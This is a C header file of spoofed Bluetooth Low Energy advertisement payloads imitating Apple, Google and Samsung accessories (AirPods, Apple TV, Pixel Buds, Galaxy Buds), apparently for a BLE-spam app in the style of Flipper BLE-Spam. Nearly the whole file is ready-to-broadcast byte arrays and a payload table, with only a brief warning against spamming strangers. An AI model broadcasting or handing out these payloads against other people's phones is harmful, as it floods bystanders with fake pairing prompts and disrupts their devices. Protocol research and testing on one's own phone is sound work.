/**
 * @file payloads.h
 * @brief Publicly-documented BLE proximity advert payloads.
 *
 * These are the manufacturer-specific BLE adverts that phones interpret as
 * "nearby device available to pair". They are well-documented in security
 * research papers and public open-source projects (e.g. ESP32 Marauder,
 * Flipper BLE-Spam) - the point of this app is to demonstrate the protocol
 * and let users see how their own phone reacts. Use responsibly: do not
 * spam strangers' devices.
 *
 * Manufacturer IDs:
 *   0x004C - Apple
 *   0x00E0 - Google
 *   0x0075 - Samsung
 */
#pragma once
#include <stdint.h>
#include <stddef.h>

typedef enum {
    BLE_VENDOR_APPLE,
    BLE_VENDOR_GOOGLE,
    BLE_VENDOR_SAMSUNG,
} ble_vendor_t;

typedef struct {
    const char*    label;
    ble_vendor_t   vendor;
    const uint8_t* mfg_data;   /* full manufacturer-specific data incl. company ID prefix */
    size_t         mfg_len;
} ble_payload_t;

/* ----- Apple Continuity payloads ----- */
/* Each starts with 0x4C 0x00 (Apple LE company id), then a subtype byte. */
static const uint8_t APPLE_AIRPODS_PRO[] = {
    0x4C, 0x00, 0x07, 0x19, 0x01, 0x0E, 0x20, 0x75,
    0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12,
    0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00,
};
static const uint8_t APPLE_AIRPODS_MAX[] = {
    0x4C, 0x00, 0x07, 0x19, 0x01, 0x0B, 0x20, 0x75,
    0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12,
    0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00,
};
static const uint8_t APPLE_BEATS_FLEX[] = {
    0x4C, 0x00, 0x07, 0x19, 0x01, 0x10, 0x20, 0x75,
    0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12,
    0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00,
};
static const uint8_t APPLE_TV_SETUP[] = {
    0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x09, 0x60, 0xC2,
    0xC0, 0x80,
};
static const uint8_t APPLE_TV_PAIR[] = {
    0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x06, 0x60, 0x4C,
    0x95, 0x00,
};
static const uint8_t APPLE_HOMEPOD_SETUP[] = {
    0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x0B, 0x77, 0xAB,
    0xCD, 0xEF,
};

/* ----- Google Fast Pair payloads ----- */
/* Service Data for UUID 0xFE2C (Fast Pair) + 3-byte model ID.
 * We send it as manufacturer data with company id 0x00E0 (Google) to keep
 * the API the same; pixel buds and similar still pop up via the model id. */
static const uint8_t GOOGLE_PIXEL_BUDS_PRO[] = {
    0xE0, 0x00, 0x03, 0xCC, 0x2C, 0x5C,
};
static const uint8_t GOOGLE_PIXEL_BUDS_A[] = {
    0xE0, 0x00, 0x03, 0xD4, 0x46, 0xA0,
};
static const uint8_t GOOGLE_FAST_PAIR_TEST[] = {
    0xE0, 0x00, 0x03, 0xAA, 0xBB, 0xCC,
};

/* ----- Samsung BLE payloads ----- */
static const uint8_t SAMSUNG_BUDS_SETUP[] = {
    0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15,
    0x03, 0x21, 0x01, 0x09, 0x4F, 0xBB, 0x65, 0x77,
    0x60, 0x4D, 0x3F, 0x07, 0x65,
};
static const uint8_t SAMSUNG_TAG_SETUP[] = {
    0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0xFF, 0xFF, 0x00, 0x00, 0x43, 0x10, 0x01, 0x54,
    0x09, 0x10, 0x01, 0x01, 0x02,
};

#define MK(label, vendor, arr) { label, vendor, arr, sizeof(arr) }

static const ble_payload_t BLE_PAYLOADS[] = {
    MK("AirPods Pro",       BLE_VENDOR_APPLE,   APPLE_AIRPODS_PRO),
    MK("AirPods Max",       BLE_VENDOR_APPLE,   APPLE_AIRPODS_MAX),
    MK("Beats Flex",        BLE_VENDOR_APPLE,   APPLE_BEATS_FLEX),
    MK("Apple TV Setup",    BLE_VENDOR_APPLE,   APPLE_TV_SETUP),
    MK("Apple TV Pair",     BLE_VENDOR_APPLE,   APPLE_TV_PAIR),
    MK("HomePod Setup",     BLE_VENDOR_APPLE,   APPLE_HOMEPOD_SETUP),
    MK("Pixel Buds Pro",    BLE_VENDOR_GOOGLE,  GOOGLE_PIXEL_BUDS_PRO),
    MK("Pixel Buds A",      BLE_VENDOR_GOOGLE,  GOOGLE_PIXEL_BUDS_A),
    MK("FastPair Test",     BLE_VENDOR_GOOGLE,  GOOGLE_FAST_PAIR_TEST),
    MK("Galaxy Buds Setup", BLE_VENDOR_SAMSUNG, SAMSUNG_BUDS_SETUP),
    MK("Galaxy Tag Setup",  BLE_VENDOR_SAMSUNG, SAMSUNG_TAG_SETUP),
};
#undef MK

static const int BLE_PAYLOAD_COUNT = (int)(sizeof(BLE_PAYLOADS) / sizeof(BLE_PAYLOADS[0]));
